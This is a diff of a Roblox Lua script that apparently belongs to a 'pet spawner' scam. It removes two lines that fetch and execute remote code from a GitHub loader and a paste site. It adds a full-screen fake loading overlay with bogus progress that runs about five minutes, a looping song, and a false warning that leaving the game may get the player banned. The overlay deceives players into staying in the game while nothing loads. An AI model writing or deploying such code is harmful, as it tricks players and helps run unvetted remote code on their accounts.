@@ -1,2 +1,82 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Ryikazu/loader/refs/heads/main/petspawner.lua"))()
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/IGCFcRsNvB/0", true))()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- UI Setup
+local screenGui = Instance.new("ScreenGui", playerGui)
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Name = "LoadingScreen"
+
+-- Full black background
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.BorderSizePixel = 0
+bg.Parent = screenGui
+
+-- Top Warning Text
+local topWarning = Instance.new("TextLabel")
+topWarning.Size = UDim2.new(1, 0, 0, 50)
+topWarning.Position = UDim2.new(0, 0, 0.25, 0)
+topWarning.Text = "⚠️‼️ Script is now executed! Please wait to fully loaded ‼️⚠️"
+topWarning.TextColor3 = Color3.fromRGB(255, 0, 0)
+topWarning.BackgroundTransparency = 1
+topWarning.Font = Enum.Font.Arcade
+topWarning.TextScaled = true
+topWarning.Parent = bg
+
+-- Middle Warning Box
+local middleBox = Instance.new("TextLabel")
+middleBox.Size = UDim2.new(0.8, 0, 0.15, 0)
+middleBox.Position = UDim2.new(0.1, 0, 0.4, 0)
+middleBox.BackgroundColor3 = Color3.fromRGB(100, 0, 150)
+middleBox.BorderColor3 = Color3.fromRGB(255, 0, 255)
+middleBox.TextColor3 = Color3.new(1, 1, 1)
+middleBox.Font = Enum.Font.Arcade
+middleBox.TextScaled = true
+middleBox.TextWrapped = true
+middleBox.Text = "⚠️ Don't leave in the game while loading the screen you might ban in the Game ⚠️"
+middleBox.Parent = bg
+
+-- Blink effect for text only
+task.spawn(function()
+	while true do
+		middleBox.TextTransparency = 1
+		task.wait(0.4)
+		middleBox.TextTransparency = 0
+		task.wait(0.4)
+	end
+end)
+
+-- Loading Text Below Middle
+local loadingLabel = Instance.new("TextLabel")
+loadingLabel.Size = UDim2.new(0.4, 0, 0, 40)
+loadingLabel.Position = UDim2.new(0.3, 0, 0.58, 0)
+loadingLabel.BackgroundTransparency = 1
+loadingLabel.TextColor3 = Color3.new(1, 1, 1)
+loadingLabel.Font = Enum.Font.Arcade
+loadingLabel.TextScaled = true
+loadingLabel.Text = "Loading: 0%"
+loadingLabel.Parent = bg
+
+-- Looping Tacos Song
+local sound = Instance.new("Sound")
+sound.Name = "TacoSong"
+sound.SoundId = "rbxassetid://142376088" -- "It's Raining Tacos" by Parry Gripp
+sound.Looped = true
+sound.Volume = 1
+sound.Parent = bg
+sound:Play()
+
+-- Delay 5 seconds before start loading
+task.wait(5)
+
+-- Slowly count from 1 to 100 with 3-second delay
+for i = 1, 100 do
+	loadingLabel.Text = "Loading: " .. i .. "%"
+	task.wait(3)
+end
+
+-- You can destroy the UI after loading here if needed
+-- screenGui:Destroy()
